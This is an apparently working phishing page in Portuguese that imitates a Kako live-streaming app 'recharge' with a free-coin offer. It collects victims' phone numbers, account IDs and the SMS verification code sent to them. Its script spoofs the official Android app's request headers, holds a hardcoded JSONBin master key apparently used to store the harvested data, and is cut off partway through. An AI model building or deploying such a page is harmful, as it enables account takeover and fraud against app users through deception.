<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga de Conta | Kako Coin</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <meta name="description" content="Sistema de recarga Kako Coin">
    <style>
        .free-badge {
            position: absolute;
            bottom: -15px;
            right: 10px;
            font-size: 12px;
            color: red;
            font-weight: bold;
        }
        .banner-flash {
            animation: flash 2s infinite;
        }
        @keyframes flash {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        .coin-option.selected {
            background-color: #7e22ce !important;
            color: white !important;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .phone-prefix {
            display: inline-flex;
            align-items: center;
            padding: 0 12px;
            background-color: #e5e7eb;
            border: 1px solid #d1d5db;
            border-right: none;
            border-radius: 6px 0 0 6px;
            height: 100%;
            color: #374151;
        }
        .validation-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
        }
        .input-wrapper {
            position: relative;
        }
        .countdown {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-top: 10px;
        }
        .timer {
            font-weight: bold;
            color: #7e22ce;
        }
        .warning-banner {
            background: linear-gradient(90deg, #f59e0b 0%, #d97706 100%);
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        /* Estilos do Modal - CORRIGIDOS */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.6);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: white;
            padding: 20px;
            border-radius: 8px;
            max-width: 300px;
            width: 100%;
            text-align: center;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body class="bg-gray-100 font-sans">
    <!-- Modal para validação do PIN - ESTRUTURA CORRIGIDA -->
    <div id="pinModal" class="modal hidden">
        <div class="modal-content">
            <h3 class="text-xl font-bold text-purple-800 mb-4">Valide seu ID</h3>
            <p class="mb-4">Enviamos um código de 6 dígitos para o seu número. Digite abaixo para validar:</p>
            
            <div id="countdown" class="countdown hidden">
                <p>Você pode solicitar um novo código em: <span id="timer" class="timer">30</span> segundos</p>
            </div>
            
            <form id="pinForm" class="space-y-4">
                <div class="input-wrapper">
                    <input type="text" id="pinInput" maxlength="6" 
                           class="w-full px-4 py-3 border border-gray-300 rounded-md text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-purple-600"
                           placeholder="000000">
                    <p id="pinError" class="text-red-600 text-sm mt-1 hidden">PIN inválido. Digite apenas números.</p>
                </div>
                <button type="submit" id="submitPinBtn" 
                        class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
                    Validar e Recarregar
                </button>
                <button type="button" onclick="document.getElementById('pinModal').classList.add('hidden')" 
                        class="w-full bg-gray-500 text-white py-3 px-4 rounded-md hover:bg-gray-600 transition duration-200 font-medium">
                    Cancelar
                </button>
            </form>
        </div>
    </div>

    <div class="container mx-auto px-4 py-8">
        <!-- Aviso acadêmico -->
        <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
            <p class="font-bold">AVISO:</p>
            <p class="mb-2">*Termos e Condições: Esta promoção é válida apenas para primeira recarga de novos usuários.</p>
            <p>A promoção é válida exclusivamente para usuários brasileiros e/ou com número de telefone nacional (+55).</p>
            <p class="mt-4">Ao realizar a recarga, você concorda com nossos Termos de Serviço e Política de Privacidade.</p>
        </div>

        <!-- Header -->
        <header class="flex justify-between items-center mb-8">
            <div class="flex items-center">
                <img src="https://play-lh.googleusercontent.com/F_Bge1FUPjFpMBcLc6ChvhbTJAIG6dDgcIKYcQJimRmnuv_qTtfVEIucrWui2VHerdvq" 
                     alt="Logo Kako" class="h-12">
                <h1 class="ml-2 text-2xl font-bold text-purple-800">KAKO COIN</h1>
                <img src="https://i.ibb.co/W4GBrhXd/images-removebg-preview.png" alt="Kako Coin" class="h-12 ml-2">
            </div>
        </header>

        <!-- Main Content -->
        <main class="flex flex-col md:flex-row gap-8">
            <!-- Form Section -->
            <div class="bg-white rounded-lg shadow-md p-6 flex-1">
                <h2 class="text-2xl font-bold text-purple-800 mb-6">Recarga de Conta</h2>
                
                <form id="rechargeForm" class="space-y-4">
                    <input type="hidden" id="amount" name="amount" value="10000">
                    
                    <div>
                        <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
                        <div class="flex input-wrapper">
                            <span class="phone-prefix">+55</span>
                            <input type="tel" id="phone" name="phone" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-purple-600"
                                   placeholder="DDD + Número">
                        </div>
                        <p id="phoneError" class="text-red-600 text-sm mt-1 hidden"></p>
                    </div>
                    
                    <div>
                        <label for="id" class="block text-sm font-medium text-gray-700 mb-1">ID (6 a 8 números)</label>
                        <div class="input-wrapper">
                            <input type="text" id="id" name="id" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-600"
                                   placeholder="Apenas números">
                        </div>
                        <p id="idError" class="text-red-600 text-sm mt-1 hidden"></p>
                    </div>
                    
                    <button type="submit" id="submitBtn" 
                            class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
                        Solicitar Código SMS
                    </button>

                    <div id="smsCountdown" class="countdown hidden">
                        <p>Próximo SMS disponível em: <span id="smsTimer" class="timer">30</span> segundos</p>
                    </div>
                </form>
            </div>
            
            <!-- Banner de Avisos Section -->
            <div class="flex-1">
                <div class="warning-banner rounded-lg shadow-md p-6 text-white mb-6 banner-flash">
                    <div class="flex items-center">
                        <div class="mr-4">
                            <i class="fas fa-exclamation-triangle text-4xl"></i>
                        </div>
                        <div>
                            <h3 class="text-2xl font-bold">ATENÇÃO: VERIFICAÇÃO DE ID OBRIGATÓRIA</h3>
                            <p class="mt-2">Para sua segurança, é necessário validar seu ID antes de realizar qualquer recarga.</p>
                        </div>
                    </div>
                </div>
                
                <div class="warning-banner rounded-lg shadow-md p-6 text-white mb-6" style="background: linear-gradient(90deg, #2196f3 0%, #1976d2 100%);">
                    <div class="flex items-center">
                        <div class="mr-4">
                            <i class="fas fa-shield-alt text-4xl"></i>
                        </div>
                        <div>
                            <h3 class="text-2xl font-bold">PROTEÇÃO DE CONTA</h3>
                            <p class="mt-2">Seu ID e telefone são criptografados e protegidos por nossas políticas de segurança.</p>
                        </div>
                    </div>
                </div>
                
                <div class="warning-banner rounded-lg shadow-md p-6 text-white mb-6" style="background: linear-gradient(90deg, #4caf50 0%, #2e7d32 100%);">
                    <div class="flex items-center">
                        <div class="mr-4">
                            <i class="fas fa-bolt text-4xl"></i>
                        </div>
                        <div>
                            <h3 class="text-2xl font-bold">PROCESSAMENTO RÁPIDO</h3>
                            <p class="mt-2">Recargas validadas são processadas em até 15 minutos após confirmação.</p>
                        </div>
                    </div>
                </div>
                
                <!-- Coin Options -->
                <div class="bg-white rounded-lg shadow-md p-6">
                    <h3 class="text-xl font-bold text-purple-800 mb-4">Opções de Recarga</h3>
                    
                    <div class="grid grid-cols-2 gap-4">
                        <button type="button" class="coin-option selected w-full bg-purple-700 text-white py-3 px-4 rounded-md hover:bg-purple-800 transition duration-200 font-medium relative" data-amount="10000">
                            10.000 Kako Moedas
                            <span class="free-badge">1x FREE</span>
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="50000">
                            50.000 Kako Moedas
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="100000">
                            100.000 Kako Moedas
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="500000">
                            500.000 Kako Moedas
                        </button>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="mt-12 text-center text-gray-600 text-sm">
            <p>© 2023 Kako Coin. Todos os direitos reservados.</p>
            <div class="mt-2 flex justify-center space-x-4">
                <a href="#" class="hover:text-purple-700">Termos de Serviço</a>
                <a href="#" class="hover:text-purple-700">Política de Privacidade</a>
                <a href="#" class="hover:text-purple-700">Contate-nos</a>
            </div>
        </footer>
    </div>

    <script>
        // Variáveis para armazenar dados temporários
        let currentPhone = '';
        let currentId = '';
        let smsCooldown = false;
        let smsCooldownTimer = null;
        let countdownTimer = null;

        // Headers para as requisições
        const COMMON_HEADERS = {
            'accept': 'application/json',
            'accept-language': 'pt',
            'x-app-devicetype': 'android',
            'x-app-version': '1.15.2',
            'x-app-bundleid': 'live.kako.global',
            'x-app-channelid': 'google',
            'x-app-buildid': '24bbabf0',
            'x-app-lang': 'pt',
            'x-app-lang-excludes': 'en,es',
            'x-app-deviceid': 'a5247afb-4d54-4867-b6ab-637496a78cf1',
            'x-app-timezone': 'America/Sao_Paulo',
            'x-app-country': 'BR',
            'x-app-devicename': 'Motorola moto g(8)',
            'content-type': 'application/json; charset=UTF-8',
            'accept-encoding': 'gzip',
            'user-agent': 'okhttp/4.12.0'
        };

        // Master Key do JSONBin
        const MASTER_KEY = "$2a$10$dcsJ/Yfcqv7h8ijkKiXFRelPZPhR1WicqE/E8kWs67CFwcRTYzcHO";

        // Inicialização
        document.addEventListener('DOMContentLoaded', function() {
            // Configurar event listeners
            setupEventListeners();
        });

        function setupEventListeners() {
            // Envio do formulário principal
            document.getElementById('rechargeForm').addEventListener('submit', handleFormSubmit);
            
            // Envio do formulário de PIN
            document.getElementById('pinForm').addEventListener('submit', handlePinSubmit);
            
            // Validação em tempo real dos campos
            document.getElementById('phone').addEventListener('input', formatPhone);
            document.getElementById('id').addEventListener('input', sanitizeId);
            document.getElementById('pinInput').addEventListener('input', validatePin);
            
            // Seleção de moedas
            document.querySelectorAll('.coin-option').forEach(button => {
                button.addEventListener('click', function() {
                    document.querySelectorAll('.coin-option').forEach(btn
